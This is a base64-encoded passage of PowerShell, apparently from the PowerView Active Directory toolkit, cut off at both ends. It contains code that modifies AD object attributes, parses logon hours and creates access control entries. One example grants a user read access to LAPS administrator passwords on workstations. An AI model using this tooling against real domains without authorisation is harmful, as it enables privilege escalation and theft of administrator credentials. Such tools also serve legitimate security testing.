LlByb3BlcnRpZXMuc2FtYWNjb3VudG5hbWUpJyIKICAgICAgICAgICAgICAgICAgICAgICAgJEVudHJ5LnB1dCgkXy5OYW1lLCAkXy5WYWx1ZSkKICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgICAgJEVudHJ5LmNvbW1pdGNoYW5nZXMoKQogICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgY2F0Y2ggewogICAgICAgICAgICAgICAgICAgIFdyaXRlLVdhcm5pbmcgIltTZXQtRG9tYWluT2JqZWN0XSBFcnJvciBzZXR0aW5nL3JlcGxhY2luZyBwcm9wZXJ0aWVzIGZvciBvYmplY3QgJyQoJFJhd09iamVjdC5Qcm9wZXJ0aWVzLnNhbWFjY291bnRuYW1lKScgOiAkXyIKICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgfQogICAgICAgICAgICBpZigkUFNCb3VuZFBhcmFtZXRlcnNbJ1hPUiddKSB7CiAgICAgICAgICAgICAgICB0cnkgewogICAgICAgICAgICAgICAgICAgICRQU0JvdW5kUGFyYW1ldGVyc1snWE9SJ10uR2V0RW51bWVyYXRvcigpIHwgRm9yRWFjaC1PYmplY3QgewogICAgICAgICAgICAgICAgICAgICAgICAkUHJvcGVydHlOYW1lID0gJF8uTmFtZQogICAgICAgICAgICAgICAgICAgICAgICAkUHJvcGVydHlYb3JWYWx1ZSA9ICRfLlZhbHVlCiAgICAgICAgICAgICAgICAgICAgICAgIFdyaXRlLVZlcmJvc2UgIltTZXQtRG9tYWluT2JqZWN0XSBYT1JpbmcgJyRQcm9wZXJ0eU5hbWUnIHdpdGggJyRQcm9wZXJ0eVhvclZhbHVlJyBmb3Igb2JqZWN0ICckKCRSYXdPYmplY3QuUHJvcGVydGllcy5zYW1hY2NvdW50bmFtZSknIgogICAgICAgICAgICAgICAgICAgICAgICAkVHlwZU5hbWUgPSAkRW50cnkuJFByb3BlcnR5TmFtZVswXS5HZXRUeXBlKCkubmFtZQoKICAgICAgICAgICAgICAgICAgICAgICAgIyBVQUMgdmFsdWUgcmVmZXJlbmNlcy0gaHR0cHM6Ly9zdXBwb3J0Lm1pY3Jvc29mdC5jb20vZW4tdXMva2IvMzA1MTQ0CiAgICAgICAgICAgICAgICAgICAgICAgICRQcm9wZXJ0eVZhbHVlID0gJCgkRW50cnkuJFByb3BlcnR5TmFtZSkgLWJ4b3IgJFByb3BlcnR5WG9yVmFsdWUKICAgICAgICAgICAgICAgICAgICAgICAgJEVudHJ5LiRQcm9wZXJ0eU5hbWUgPSAkUHJvcGVydHlWYWx1ZSAtYXMgJFR5cGVOYW1lCiAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgICAgICRFbnRyeS5jb21taXRjaGFuZ2VzKCkKICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgIGNhdGNoIHsKICAgICAgICAgICAgICAgICAgICBXcml0ZS1XYXJuaW5nICJbU2V0LURvbWFpbk9iamVjdF0gRXJyb3IgWE9SJ2luZyBwcm9wZXJ0aWVzIGZvciBvYmplY3QgJyQoJFJhd09iamVjdC5Qcm9wZXJ0aWVzLnNhbWFjY291bnRuYW1lKScgOiAkXyIKICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgfQogICAgICAgICAgICBpZigkUFNCb3VuZFBhcmFtZXRlcnNbJ0NsZWFyJ10pIHsKICAgICAgICAgICAgICAgIHRyeSB7CiAgICAgICAgICAgICAgICAgICAgJFBTQm91bmRQYXJhbWV0ZXJzWydDbGVhciddIHwgRm9yRWFjaC1PYmplY3QgewogICAgICAgICAgICAgICAgICAgICAgICAkUHJvcGVydHlOYW1lID0gJF8KICAgICAgICAgICAgICAgICAgICAgICAgV3JpdGUtVmVyYm9zZSAiW1NldC1Eb21haW5PYmplY3RdIENsZWFyaW5nICckUHJvcGVydHlOYW1lJyBmb3Igb2JqZWN0ICckKCRSYXdPYmplY3QuUHJvcGVydGllcy5zYW1hY2NvdW50bmFtZSknIgogICAgICAgICAgICAgICAgICAgICAgICAkRW50cnkuJFByb3BlcnR5TmFtZS5jbGVhcigpCiAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgICAgICRFbnRyeS5jb21taXRjaGFuZ2VzKCkKICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgIGNhdGNoIHsKICAgICAgICAgICAgICAgICAgICBXcml0ZS1XYXJuaW5nICJbU2V0LURvbWFpbk9iamVjdF0gRXJyb3IgY2xlYXJpbmcgcHJvcGVydGllcyBmb3Igb2JqZWN0ICckKCRSYXdPYmplY3QuUHJvcGVydGllcy5zYW1hY2NvdW50bmFtZSknIDogJF8iCiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgIH0KICAgICAgICB9CiAgICB9Cn0KCgpmdW5jdGlvbiBDb252ZXJ0RnJvbS1MREFQTG9nb25Ib3VycyB7CjwjCi5TWU5PUFNJUwoKQ29udmVydHMgdGhlIExEQVAgTG9nb25Ib3VycyBhcnJheSB0byBhIHByb2Nlc3NpYmxlIG9iamVjdC4KCkF1dGhvcjogTGVlIENocmlzdGVuc2VuIChAdGlma2luXykgIApMaWNlbnNlOiBCU0QgMy1DbGF1c2UgIApSZXF1aXJlZCBEZXBlbmRlbmNpZXM6IE5vbmUKCi5ERVNDUklQVElPTgoKQ29udmVydHMgdGhlIExEQVAgTG9nb25Ib3VycyBhcnJheSB0byBhIHByb2Nlc3NpYmxlIG9iamVjdC4gIEVhY2ggZW50cnkKcHJvcGVydHkgaW4gdGhlIG91dHB1dCBvYmplY3QgY29ycmVzcG9uZHMgdG8gYSBkYXkgb2YgdGhlIHdlZWsgYW5kIGhvdXIgZHVyaW5nCnRoZSBkYXkgKGluIFVUQykgaW5kaWNhdGluZyB3aGV0aGVyIG9yIG5vdCB0aGUgdXNlciBjYW4gbG9nb24gYXQgdGhlIHNwZWNpZmllZApob3VyLgoKLlBBUkFNRVRFUiBMb2dvbkhvdXJzQXJyYXkKCjIxLWJ5dGUgTERBUCBob3VycyBhcnJheS4KCi5FWEFNUExFCgokaG91cnMgPSAoR2V0LURvbWFpblVzZXIgLUxEQVBGaWx0ZXIgJ3VzZXJ3b3Jrc3RhdGlvbnM9KicpWzBdLmxvZ29uaG91cnMKQ29udmVydEZyb20tTERBUExvZ29uSG91cnMgJGhvdXJzCgpHZXRzIHRoZSBsb2dvbmhvdXJzIGFycmF5IGZyb20gdGhlIGZpcnN0IEFEIHVzZXIgd2l0aCBsb2dvbiByZXN0cmljdGlvbnMuCgouT1VUUFVUUwoKUG93ZXJWaWV3LkxvZ29uSG91cnMKIz4KCiAgICBbRGlhZ25vc3RpY3MuQ29kZUFuYWx5c2lzLlN1cHByZXNzTWVzc2FnZUF0dHJpYnV0ZSgnUFNVc2VEZWNsYXJlZFZhcnNNb3JlVGhhbkFzc2lnbm1lbnRzJywgJycpXQogICAgW0RpYWdub3N0aWNzLkNvZGVBbmFseXNpcy5TdXBwcmVzc01lc3NhZ2VBdHRyaWJ1dGUoJ1BTU2hvdWxkUHJvY2VzcycsICcnKV0KICAgIFtPdXRwdXRUeXBlKCdQb3dlclZpZXcuTG9nb25Ib3VycycpXQogICAgW0NtZGxldEJpbmRpbmcoKV0KICAgIFBhcmFtICgKICAgICAgICBbUGFyYW1ldGVyKCBWYWx1ZUZyb21QaXBlbGluZSA9ICRUcnVlLCBWYWx1ZUZyb21QaXBlbGluZUJ5UHJvcGVydHlOYW1lID0gJFRydWUpXQogICAgICAgIFtWYWxpZGF0ZU5vdE51bGxPckVtcHR5KCldCiAgICAgICAgW2J5dGVbXV0KICAgICAgICAkTG9nb25Ib3Vyc0FycmF5CiAgICApCgogICAgQmVnaW4gewogICAgICAgIGlmKCRMb2dvbkhvdXJzQXJyYXkuQ291bnQgLW5lIDIxKSB7CiAgICAgICAgICAgIHRocm93ICJMb2dvbkhvdXJzQXJyYXkgaXMgdGhlIGluY29ycmVjdCBsZW5ndGgiCiAgICAgICAgfQoKICAgICAgICBmdW5jdGlvbiBDb252ZXJ0VG8tTG9nb25Ib3Vyc0FycmF5IHsKICAgICAgICAgICAgUGFyYW0gKAogICAgICAgICAgICAgICAgW2ludFtdXQogICAgICAgICAgICAgICAgJEhvdXJzQXJyCiAgICAgICAgICAgICkKCiAgICAgICAgICAgICRMb2dvbkhvdXJzID0gTmV3LU9iamVjdCBib29sW10gMjQKICAgICAgICAgICAgZm9yKCRpPTA7ICRpIC1sdCAzOyAkaSsrKSB7CiAgICAgICAgICAgICAgICAkQnl0ZSA9ICRIb3Vyc0FyclskaV0KICAgICAgICAgICAgICAgICRPZmZzZXQgPSAkaSAqIDgKICAgICAgICAgICAgICAgICRTdHIgPSBbQ29udmVydF06OlRvU3RyaW5nKCRCeXRlLDIpLlBhZExlZnQoOCwnMCcpCgogICAgICAgICAgICAgICAgJExvZ29uSG91cnNbJE9mZnNldCswXSA9IFtib29sXSBbY29udmVydF06OlRvSW50MzIoW3N0cmluZ10kU3RyWzddKQogICAgICAgICAgICAgICAgJExvZ29uSG91cnNbJE9mZnNldCsxXSA9IFtib29sXSBbY29udmVydF06OlRvSW50MzIoW3N0cmluZ10kU3RyWzZdKQogICAgICAgICAgICAgICAgJExvZ29uSG91cnNbJE9mZnNldCsyXSA9IFtib29sXSBbY29udmVydF06OlRvSW50MzIoW3N0cmluZ10kU3RyWzVdKQogICAgICAgICAgICAgICAgJExvZ29uSG91cnNbJE9mZnNldCszXSA9IFtib29sXSBbY29udmVydF06OlRvSW50MzIoW3N0cmluZ10kU3RyWzRdKQogICAgICAgICAgICAgICAgJExvZ29uSG91cnNbJE9mZnNldCs0XSA9IFtib29sXSBbY29udmVydF06OlRvSW50MzIoW3N0cmluZ10kU3RyWzNdKQogICAgICAgICAgICAgICAgJExvZ29uSG91cnNbJE9mZnNldCs1XSA9IFtib29sXSBbY29udmVydF06OlRvSW50MzIoW3N0cmluZ10kU3RyWzJdKQogICAgICAgICAgICAgICAgJExvZ29uSG91cnNbJE9mZnNldCs2XSA9IFtib29sXSBbY29udmVydF06OlRvSW50MzIoW3N0cmluZ10kU3RyWzFdKQogICAgICAgICAgICAgICAgJExvZ29uSG91cnNbJE9mZnNldCs3XSA9IFtib29sXSBbY29udmVydF06OlRvSW50MzIoW3N0cmluZ10kU3RyWzBdKQogICAgICAgICAgICB9CgogICAgICAgICAgICAkTG9nb25Ib3VycwogICAgICAgIH0KICAgIH0KCiAgICBQcm9jZXNzIHsKICAgICAgICAkT3V0cHV0ID0gQHsKICAgICAgICAgICAgU3VuZGF5ID0gQ29udmVydFRvLUxvZ29uSG91cnNBcnJheSAtSG91cnNBcnIgJExvZ29uSG91cnNBcnJheVswLi4yXQogICAgICAgICAgICBNb25kYXkgPSBDb252ZXJ0VG8tTG9nb25Ib3Vyc0FycmF5IC1Ib3Vyc0FyciAkTG9nb25Ib3Vyc0FycmF5WzMuLjVdCiAgICAgICAgICAgIFR1ZXNkYXkgPSBDb252ZXJ0VG8tTG9nb25Ib3Vyc0FycmF5IC1Ib3Vyc0FyciAkTG9nb25Ib3Vyc0FycmF5WzYuLjhdCiAgICAgICAgICAgIFdlZG5lc2RheSA9IENvbnZlcnRUby1Mb2dvbkhvdXJzQXJyYXkgLUhvdXJzQXJyICRMb2dvbkhvdXJzQXJyYXlbOS4uMTFdCiAgICAgICAgICAgIFRodXJzID0gQ29udmVydFRvLUxvZ29uSG91cnNBcnJheSAtSG91cnNBcnIgJExvZ29uSG91cnNBcnJheVsxMi4uMTRdCiAgICAgICAgICAgIEZyaWRheSA9IENvbnZlcnRUby1Mb2dvbkhvdXJzQXJyYXkgLUhvdXJzQXJyICRMb2dvbkhvdXJzQXJyYXlbMTUuLjE3XQogICAgICAgICAgICBTYXR1cmRheSA9IENvbnZlcnRUby1Mb2dvbkhvdXJzQXJyYXkgLUhvdXJzQXJyICRMb2dvbkhvdXJzQXJyYXlbMTguLjIwXQogICAgICAgIH0KCiAgICAgICAgJE91dHB1dCA9IE5ldy1PYmplY3QgUFNPYmplY3QgLVByb3BlcnR5ICRPdXRwdXQKICAgICAgICAkT3V0cHV0LlBTT2JqZWN0LlR5cGVOYW1lcy5JbnNlcnQoMCwgJ1Bvd2VyVmlldy5Mb2dvbkhvdXJzJykKICAgICAgICAkT3V0cHV0CiAgICB9Cn0KCgpmdW5jdGlvbiBOZXctQURPYmplY3RBY2Nlc3NDb250cm9sRW50cnkgewo8IwouU1lOT1BTSVMKCkNyZWF0ZXMgYSBuZXcgQWN0aXZlIERpcmVjdG9yeSBvYmplY3Qtc3BlY2lmaWMgYWNjZXNzIGNvbnRyb2wgZW50cnkuCgpBdXRob3I6IExlZSBDaHJpc3RlbnNlbiAoQHRpZmtpbl8pICAKTGljZW5zZTogQlNEIDMtQ2xhdXNlICAKUmVxdWlyZWQgRGVwZW5kZW5jaWVzOiBOb25lCgouREVTQ1JJUFRJT04KCkNyZWF0ZXMgYSBuZXcgb2JqZWN0LXNwZWNpZmljIGFjY2VzcyBjb250cm9sIGVudHJ5IChBQ0UpLiAgVGhlIEFDRSBjb3VsZCBiZSAKdXNlZCBmb3IgYXVkaXRpbmcgYWNjZXNzIHRvIGFuIG9iamVjdCBvciBjb250cm9sbGluZyBhY2Nlc3MgdG8gb2JqZWN0cy4KCi5QQVJBTUVURVIgUHJpbmNpcGFsSWRlbnRpdHkKCkEgU2FtQWNjb3VudE5hbWUgKGUuZy4gaGFybWoweSksIERpc3Rpbmd1aXNoZWROYW1lIChlLmcuIENOPWhhcm1qMHksQ049VXNlcnMsREM9dGVzdGxhYixEQz1sb2NhbCksClNJRCAoZS5nLiBTLTEtNS0yMS04OTAxNzE4NTktMzQzMzgwOTI3OS0zMzY2MTk2NzUzLTExMDgpLCBvciBHVUlEIChlLmcuIDRjNDM1ZGQ3LWRjNTgtNGIxNC05YTVlLTFmZGIwZTgwZDIwMSkKZm9yIHRoZSBkb21haW4gcHJpbmNpcGFsIHRvIGFkZCBmb3IgdGhlIEFDTC4gUmVxdWlyZWQuIFdpbGRjYXJkcyBhY2NlcHRlZC4KCi5QQVJBTUVURVIgUHJpbmNpcGFsRG9tYWluCgpTcGVjaWZpZXMgdGhlIGRvbWFpbiBmb3IgdGhlIFRhcmdldElkZW50aXR5IHRvIHVzZSBmb3IgdGhlIHByaW5jaXBhbCwgZGVmYXVsdHMgdG8gdGhlIGN1cnJlbnQgZG9tYWluLgoKLlBBUkFNRVRFUiBQcmluY2lwYWxTZWFyY2hCYXNlCgpUaGUgTERBUCBzb3VyY2UgdG8gc2VhcmNoIHRocm91Z2ggZm9yIHByaW5jaXBhbHMsIGUuZy4gIkxEQVA6Ly9PVT1zZWNyZXQsREM9dGVzdGxhYixEQz1sb2NhbCIKVXNlZnVsIGZvciBPVSBxdWVyaWVzLgoKLlBBUkFNRVRFUiBTZXJ2ZXIKClNwZWNpZmllcyBhbiBBY3RpdmUgRGlyZWN0b3J5IHNlcnZlciAoZG9tYWluIGNvbnRyb2xsZXIpIHRvIGJpbmQgdG8uCgouUEFSQU1FVEVSIFNlYXJjaFNjb3BlCgpTcGVjaWZpZXMgdGhlIHNjb3BlIHRvIHNlYXJjaCB1bmRlciwgQmFzZS9PbmVMZXZlbC9TdWJ0cmVlIChkZWZhdWx0IG9mIFN1YnRyZWUpLgoKLlBBUkFNRVRFUiBSZXN1bHRQYWdlU2l6ZQoKU3BlY2lmaWVzIHRoZSBQYWdlU2l6ZSB0byBzZXQgZm9yIHRoZSBMREFQIHNlYXJjaGVyIG9iamVjdC4KCi5QQVJBTUVURVIgU2VydmVyVGltZUxpbWl0CgpTcGVjaWZpZXMgdGhlIG1heGltdW0gYW1vdW50IG9mIHRpbWUgdGhlIHNlcnZlciBzcGVuZHMgc2VhcmNoaW5nLiBEZWZhdWx0IG9mIDEyMCBzZWNvbmRzLgoKLlBBUkFNRVRFUiBUb21ic3RvbmUKClN3aXRjaC4gU3BlY2lmaWVzIHRoYXQgdGhlIHNlYXJjaGVyIHNob3VsZCBhbHNvIHJldHVybiBkZWxldGVkL3RvbWJzdG9uZWQgb2JqZWN0cy4KCi5QQVJBTUVURVIgQ3JlZGVudGlhbAoKQSBbTWFuYWdlbWVudC5BdXRvbWF0aW9uLlBTQ3JlZGVudGlhbF0gb2JqZWN0IG9mIGFsdGVybmF0ZSBjcmVkZW50aWFscwpmb3IgY29ubmVjdGlvbiB0byB0aGUgdGFyZ2V0IGRvbWFpbi4KCi5QQVJBTUVURVIgUmlnaHQKClNwZWNpZmllcyB0aGUgcmlnaHRzIHNldCBvbiB0aGUgQWN0aXZlIERpcmVjdG9yeSBvYmplY3QuCgouUEFSQU1FVEVSIEFjY2Vzc0NvbnRyb2xUeXBlCgpTcGVjaWZpZXMgdGhlIHR5cGUgb2YgQUNFIChhbGxvdyBvciBkZW55KQoKLlBBUkFNRVRFUiBBdWRpdEZsYWcKCkZvciBhdWRpdCBBQ0VzLCBzcGVjaWZpZXMgd2hlbiB0byBjcmVhdGUgYW4gYXVkaXQgbG9nIChvbiBzdWNjZXNzIG9yIGZhaWx1cmUpCgouUEFSQU1FVEVSIE9iamVjdFR5cGUKClNwZWNpZmllcyB0aGUgR1VJRCBvZiB0aGUgb2JqZWN0IHRoYXQgdGhlIEFDRSBhcHBsaWVzIHRvLgoKLlBBUkFNRVRFUiBJbmhlcml0YW5jZVR5cGUKClNwZWNpZmllcyBob3cgdGhlIEFDRSBhcHBsaWVzIHRvIHRoZSBvYmplY3QgYW5kL29yIGl0cyBjaGlsZHJlbi4KCi5QQVJBTUVURVIgSW5oZXJpdGVkT2JqZWN0VHlwZQoKU3BlY2lmaWVzIHRoZSB0eXBlIG9mIG9iamVjdCB0aGF0IGNhbiBpbmhlcml0IHRoZSBBQ0UuCgouRVhBTVBMRQoKJEd1aWRzID0gR2V0LURvbWFpbkdVSURNYXAKJEFkbVByb3BlcnR5R3VpZCA9ICRHdWlkcy5HZXRFbnVtZXJhdG9yKCkgfCA/eyRfLnZhbHVlIC1lcSAnbXMtTWNzLUFkbVB3ZCd9IHwgc2VsZWN0IC1FeHBhbmRQcm9wZXJ0eSBuYW1lCiRDb21wUHJvcGVydHlHdWlkID0gJEd1aWRzLkdldEVudW1lcmF0b3IoKSB8ID97JF8udmFsdWUgLWVxICdDb21wdXRlcid9IHwgc2VsZWN0IC1FeHBhbmRQcm9wZXJ0eSBuYW1lCiRBQ0UgPSBOZXctQURPYmplY3RBY2Nlc3NDb250cm9sRW50cnkgLVZlcmJvc2UgLVByaW5jaXBhbElkZW50aXR5IGl0YWRtaW4gLVJpZ2h0IEV4dGVuZGVkUmlnaHQsUmVhZFByb3BlcnR5IC1BY2Nlc3NDb250cm9sVHlwZSBBbGxvdyAtT2JqZWN0VHlwZSAkQWRtUHJvcGVydHlHdWlkIC1Jbmhlcml0YW5jZVR5cGUgQWxsIC1Jbmhlcml0ZWRPYmplY3RUeXBlICRDb21wUHJvcGVydHlHdWlkCiRPVSA9IEdldC1Eb21haW5PVSAtUmF3IFdvcmtzdGF0aW9ucwokRHNFbnRyeSA9ICRPVS5HZXREaXJlY3RvcnlFbnRyeSgpCiRkc0VudHJ5LlBzQmFzZS5PcHRpb25zLlNlY3VyaXR5TWFza3MgPSAnRGFjbCcKJGRzRW50cnkuUHNCYXNlLk9iamVjdFNlY3VyaXR5LkFkZEFjY2Vzc1J1bGUoJEFDRSkKJGRzRW50cnkuUHNCYXNlLkNvbW1pdENoYW5nZXMoKQoKQWRkcyBhbiBBQ0UgdG8gYWxsIGNvbXB1dGVyIG9iamVjdHMgaW4gdGhlIE9VICJXb3Jrc3RhdGlvbnMiIHBlcm1pdHRpbmcgdGhlCnVzZXIgIml0YWRtaW4iIHRvIHJlYWQgdGhlIGNvbmZpZGVudGlhbCBtcy1NY3MtQWRtUHdkIGNvbXB1dGVyIHByb3BlcnR5LgoKLk9VVFBVVFMKClN5c3RlbS5TZWN1cml0eS5BY2Nlc3NDb250cm9sLkF1dGhvcml6YXRpb25SdWxlCiM+CgogICAgW0RpYWdub3N0aWNzLkNvZGVBbmFseXNpcy5TdXBwcmVzc01lc3NhZ2VBdHRyaWJ1dGUoJ1BTVXNlU2hvdWxkUHJvY2Vzc0ZvclN0YXRlQ2hhbmdpbmdGdW5jdGlvbnMnLCAnJyldCiAgICBbRGlhZ25vc3RpY3MuQ29kZUFuYWx5c2lzLlN1cHByZXNzTWVzc2FnZUF0dHJpYnV0ZSgnUFNTaG91bGRQcm9jZXNzJywgJycpXQogICAgW091dHB1dFR5cGUoJ1N5c3RlbS5TZWN1cml0eS5BY2Nlc3NDb250cm9sLkF1dGhvcml6YXRpb25SdWxlJyldCiAgICBbQ21kbGV0QmluZGluZygpXQogICAgUGFyYW0gKAogICAgICAgIFtQYXJhbWV0ZXIoUG9zaXRpb24gPSAwLCBWYWx1ZUZyb21QaXBlbGluZSA9ICRUcnVlLCBWYWx1ZUZyb21QaXBlbGluZUJ5UHJvcGVydHlOYW1lID0gJFRydWUsIE1hbmRhdG9yeSA9ICRUcnVlKV0KICAgICAgICBbQWxpYXMoJ0Rpc3Rpbmd1aXNoZWROYW1lJywgJ1NhbUFjY291bnROYW1lJywgJ05hbWUnKV0KICAgICAgICBbU3RyaW5nXQogICAgICAgICRQcmluY2lwYWxJZGVudGl0eSwKCiAgICAgICAgW1ZhbGlkYXRlTm90TnVsbE9yRW1wdHkoKV0KICAgICAgICBbU3RyaW5nXQogICAgICAgICRQcmluY2lwYWxEb21haW4sCgogICAgICAgIFtWYWxpZGF0ZU5vdE51bGxPckVtcHR5KCldCiAgICAgICAgW0FsaWFzKCdEb21haW5Db250cm9sbGVyJyldCiAgICAgICAgW1N0cmluZ10KICAgICAgICAkU2VydmVyLAoKICAgICAgICBbVmFsaWRhdGVTZXQoJ0Jhc2UnLCAnT25lTGV2ZWwnLCAnU3VidHJlZScpXQogICAgICAgIFtTdHJpbmddCiAgICAgICAgJFNlYXJjaFNjb3BlID0gJ1N1YnRyZWUnLAoKICAgICAgICBbVmFsaWRhdGVSYW5nZSgxLCAxMDAwMCldCiAgICAgICAgW0ludF0KICAgICAgICAkUmVzdWx0UGFnZVNpemUgPSAyMDAsCgogICAgICAgIFtWYWxpZGF0ZVJhbmdlKDEsIDEwMDAwKV0KICAgICAgICBbSW50XQogICAgICAgICRTZXJ2ZXJUaW1lTGltaXQsCgogICAgICAgIFtTd2l0Y2hdCiAgICAgICAgJFRvbWJzdG9uZSwKCiAgICAgICAgW01hbmFnZW1lbnQuQXV0b21hdGlvbi5QU0NyZWRlbnRpYWxdCiAgICAgICAgW01hbmFnZW1lbnQuQXV0b21hdGlvbi5DcmVkZW50aWFsQXR0cmlidXRlKCldCiAgICAgICAgJENyZWRlbnRpYWwgPSBbTWFuYWdlbWVudC5BdXRvbWF0aW9uLlBTQ3JlZGVudGlhbF06OkVtcHR5LAoKICAgICAgICBbUGFyYW1ldGVyKE1hbmRhdG9yeSA9ICRUcnVlKV0KICAgICAgICBbVmFsaWRhdGVTZXQoJ0FjY2Vzc1N5c3RlbVNlY3VyaXR5JywgJ0NyZWF0ZUNoaWxkJywnRGVsZXRlJywnRGVsZXRlQ2hpbGQnLCdEZWxldGVUcmVlJywnRXh0ZW5kZWRSaWdodCcsJ0dlbmVyaWNBbGwnLCdHZW5lcmljRXhlY3V0ZScsJ0dlbmVyaWNSZWFkJywnR2VuZXJpY1dyaXRlJywnTGlzdENoaWxkcmVuJywnTGlzdE9iamVjdCcsJ1JlYWRDb250cm9sJywnUmVhZFByb3BlcnR5JywnU2VsZicsJ1N5bmNocm9uaXplJywnV3JpdGVEYWNsJywnV3JpdGVPd25lcicsJ1dyaXRlUHJvcGVydHknKV0KICAgICAgICAkUmlnaHQsCgogICAgICAgIFtQYXJhbWV0ZXIoTWFuZGF0b3J5ID0gJFRydWUsIFBhcmFtZXRlclNldE5hbWU9J0FjY2Vzc1J1bGVUeXBlJyldCiAgICAgICAgW1ZhbGlkYXRlU2V0KCdBbGxvdycsICdEZW55JyldCiAgICAgICAgW1N0cmluZ1tdXQogICAgICAgICRBY2Nlc3NDb250cm9sVHlwZSwKCiAgICAgICAgW1BhcmFtZXRlcihNYW5kYXRvcnkgPSAkVHJ1ZSwgUGFyYW1ldGVyU2V0TmFtZT0nQXVkaXRSdWxlVHlwZScpXQogICAgICAgIFtWYWxpZGF0ZVNldCgnU3VjY2VzcycsICdGYWlsdXJlJyldCiAgICAgICAgW1N0cmluZ10KICAgICAgICAkQXVkaXRGbGFnLAoKICAgICAgICBbUGFyYW1ldGVyKE1hbmRhdG9yeSA9ICRGYWxzZSwgUGFyYW1ldGVyU2V0TmFtZT0nQWNjZXNzUnVsZVR5cGUnKV0KICAgICAgICBbUGFyYW1ldGVyKE1hbmRhdG9yeSA9ICRGYWxzZSwgUGFyYW1ldGVyU2V0TmFtZT0nQXVkaXRSdWxlVHlwZScpXQogICAgICAgIFtQYXJhbWV0ZXIoTWFuZGF0b3J5ID0gJEZhbHNlLCBQYXJhbWV0ZXJTZXROYW1lPSdPYmplY3RHdWlkTG9va3VwJyldCiAgICAgICAgW0d1aWRdCiAgICAgICAgJE9iamVjdFR5cGUsCgogICAgICAgIFtWYWxpZGF0ZVNldCgnQWxsJywgJ0NoaWxkcmVuJywnRGVzY2VuZGVudHMnLCdOb25lJywnU2VsZkFuZENoaWxkcmVuJyldCiAgICAgICAgW1N0cmluZ10KICAgICAgICAkSW5oZXJpdGFuY2VUeXBlLAoKICAgICAgICBbR3VpZF0KICAgICAgICAkSW5oZXJpdGVkT2JqZWN0VHlwZQogICAgKQoKICAgIEJlZ2luIHsKICAgICAgICBpZiAoJFByaW5jaXBhbElkZW50aXR5IC1ub3RtYXRjaCAnXlMtMS0uKicpIHsKICAgICAgICAgICAgJFByaW5jaXBhbFNlYXJjaGVyQXJndW1lbnRzID0gQHsKICAgICAgICAgICAgICAgICdJZGVudGl0eScgPSAkUHJpbmNpcGFsSWRlbnRpdHkKICAgICAgICAgICAgICAgICdQcm9wZXJ0aWVzJyA9ICdkaXN0aW5ndWlzaGVkbmFtZSxvYmplY3RzaWQnCiAgICAgICAgICAgIH0KICAgICAgICAgICAgaWYgKCRQU0JvdW5kUGFyYW1ldGVyc1snUHJpbmNpcGFsRG9tYWluJ10pIHsgJFByaW5jaXBhbFNlYXJjaGVyQXJndW1lbnRzWydEb21haW4nXSA9ICRQcmluY2lwYWxEb21haW4gfQogICAgICAgICAgICBpZiAoJFBTQm91bmRQYXJhbWV0ZXJzWydTZXJ2ZXInXSkgeyAkUHJpbmNpcGFsU2VhcmNoZXJBcmd1bWVudHNbJ1NlcnZlciddID0gJFNlcnZlciB9CiAgICAgICAgICAgIGlmICgkUFNCb3VuZFBhcmFtZXRlcnNbJ1NlYXJjaFNjb3BlJ10pIHsgJFByaW5jaXBhbFNlYXJjaGVyQXJndW1lbnRzWydTZWFyY2hTY29wZSddID0gJFNlYXJjaFNjb3BlIH0KICAgICAgICAgICAgaWYgKCRQU0JvdW5kUGFyYW1ldGVyc1snUmVzdWx0UGFnZVNpemUnXSkgeyAkUHJpbmNpcGFsU2VhcmNoZXJBcmd1bWVudHNbJ1Jlc3VsdFBhZ2VTaXplJ10gPSAkUmVzdWx0UGFnZVNpemUgfQogICAgICAgICAgICBpZiAoJFBTQm91bmRQYXJhbWV0ZXJzWydTZXJ2ZXJUaW1lTGltaXQnXSkgeyAkUHJpbmNpcGFsU2VhcmNoZXJBcmd1bWVudHNbJ1NlcnZlclRpbWVMaW1pdCddID0gJFNlcnZlclRpbWVMaW1pdCB9CiAgICAgICAgICAgIGlmICgkUFNCb3VuZFBhcmFtZXRlcnNbJ1RvbWJzdG9uZSddKSB7ICRQcmluY2lwYWxTZWFyY2hlckFyZ3VtZW50c1snVG9tYnN0b25lJ10gPSAkVG9tYnN0b25lIH0KICAgICAgICAgICAgaWYgKCRQU0JvdW5kUGFyYW1ldGVyc1snQ3JlZGVudGlhbCddKSB7ICRQcmluY2lwYWxTZWFyY2hlckFyZ3VtZW50c1snQ3JlZGVudGlhbCddID0gJENyZWRlbnRpYWwgfQogICAgICAgICAgICAkUHJpbmNpcGFsID0gR2V0LURvbWFpbk9iamVjdCBAUHJpbmNpcGFsU2VhcmNoZXJBcmd1bWVudHMKICAgICAgICAgICAgaWYgKC1ub3QgJFByaW5jaXBhbCkgewogICAgICAgICAgICAgICAgdGhyb3cgIlVuYWJsZSB0byByZXNvbHZlIHByaW5jaXBhbDogJFByaW5jaXBhbElkZW50aXR5IgogICAgICAgICAgICB9CiAgICAgICAgICAgIGVsc2VpZigkUHJpbmNpcGFsLkNvdW50IC1ndCAxKSB7CiAgICAgICAgICAgICAgICB0aHJvdyAiUHJpbmNpcGFsSWRlbnRpdHkgbWF0Y2hlcyBtdWx0aXBsZSBBRCBvYmplY3RzLCBidXQgb25seSBvbmUgaXMgYWxsb3dlZCIKICAgICAgICAgICAgfQogICAgICAgICAgICAkT2JqZWN0U2lkID0gJFByaW5jaXBhbC5vYmplY3RzaWQKICAgICAgICB9CiAgICAgICAgZWxzZSB7CiAgICAgICAgICAgICRPYmplY3RTaWQgPSAkUHJpbmNpcGFsSWRlbnRpdHkKICAgICAgICB9CgogICAgICAgICRBRFJpZ2h0ID0gMAogICAgICAgIGZvcmVhY2goJHIgaW4gJFJpZ2h0KSB7CiAgICAgICAgICAgICRBRFJpZ2h0ID0gJEFEUmlnaHQgLWJvciAoKFtTeXN0ZW0uRGlyZWN0b3J5U2VydmljZXMuQWN0aXZlRGlyZWN0b3J5UmlnaHRzXSRyKS52YWx1ZV9fKQogICAgICAgIH0KICAgICAgICAkQURSaWdodCA9IFtTeXN0ZW0uRGlyZWN0b3J5U2VydmljZXMuQWN0aXZlRGlyZWN